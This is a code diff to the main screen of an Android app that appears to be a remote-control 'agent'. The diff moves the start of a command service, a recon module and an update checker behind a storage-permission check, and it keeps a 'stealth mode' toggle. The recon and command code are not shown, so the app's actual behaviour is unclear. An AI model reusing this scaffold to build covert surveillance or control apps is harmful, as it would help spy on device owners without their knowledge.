@@ -11,42 +11,50 @@ import android.Manifest;
 import android.util.Log;
 import android.widget.Switch;
 import android.widget.TextView;
+import android.widget.Toast;
+import android.widget.Button;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
-import com.mobilemorph.agent.services.CommandService;
 import android.provider.Settings;
-import android.widget.Toast;
+import com.mobilemorph.agent.ReconModule;
+import com.mobilemorph.agent.services.CommandService;
+import com.mobilemorph.agent.UpdateChecker;
 
 public class MainActivity extends Activity {
     private static final int REQUEST_PERMISSIONS = 100;
     private SharedPreferences prefs;
+    private Button startAgentButton;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        Button startAgentButton = findViewById(R.id.startAgentButton);
-        startAgentButton.setOnClickListener(v -> {
-            Intent serviceIntent = new Intent(MainActivity.this, CommandService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(serviceIntent);
-            } else {
-                startService(serviceIntent);
-            }
-            Toast.makeText(MainActivity.this, "Agent Started", Toast.LENGTH_SHORT).show();
-        });
+        prefs = getSharedPreferences("agent", MODE_PRIVATE);
 
+        // Display device ID
         TextView deviceIdText = findViewById(R.id.deviceIdText);
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         deviceIdText.setText("Device ID: " + deviceId);
-        prefs = getSharedPreferences("agent", MODE_PRIVATE);
+
+        // Setup "Start Agent" button
+        startAgentButton = findViewById(R.id.startAgentButton);
+        startAgentButton.setOnClickListener(v -> {
+            if (!hasStoragePermissions()) {
+                Toast.makeText(this, "Permission required to start agent", Toast.LENGTH_SHORT).show();
+                return;
+            }
+            startAgentService();
+            Toast.makeText(MainActivity.this, "Agent Started", Toast.LENGTH_SHORT).show();
+        });
+
+        // Disable the button until permission is granted
+        startAgentButton.setEnabled(hasStoragePermissions());
 
         // Toggle for stealth mode
         Switch serverToggle = findViewById(R.id.serverToggle);
         boolean stealth = prefs.getBoolean("stealth_mode", false);
         serverToggle.setChecked(stealth);
-
         // On toggle click, update stealth mode setting
         serverToggle.setOnCheckedChangeListener((buttonView, isChecked) -> {
             prefs.edit().putBoolean("stealth_mode", isChecked).apply();
@@ -56,24 +64,22 @@ public class MainActivity extends Activity {
             }
         });
 
-        // Start core agent behavior
-        ReconModule.runRecon(this);
-        UpdateChecker.checkForUpdate(this);
-
         requestRuntimePermissions();  // Will start CommandService if granted
     }
 
+    private boolean hasStoragePermissions() {
+        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+    }
+
     private void requestRuntimePermissions() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
-                    != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(this,
-                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
-                        REQUEST_PERMISSIONS);
-                return;
-            }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !hasStoragePermissions()) {
+            ActivityCompat.requestPermissions(this,
+                new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
+                REQUEST_PERMISSIONS);
+        } else {        
+            startAgentService();
+            startAgentButton.setEnabled(true);
         }
-        startAgentService();
     }
 
     @Override
@@ -81,10 +87,14 @@ public class MainActivity extends Activity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == REQUEST_PERMISSIONS && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
             startAgentService();
+            startAgentButton.setEnabled(true);
         }
     }
 
     private void startAgentService() {
+        // Start core agent behavior
+        ReconModule.runRecon(this);
+        UpdateChecker.checkForUpdate(this);
         Intent serviceIntent = new Intent(this, CommandService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
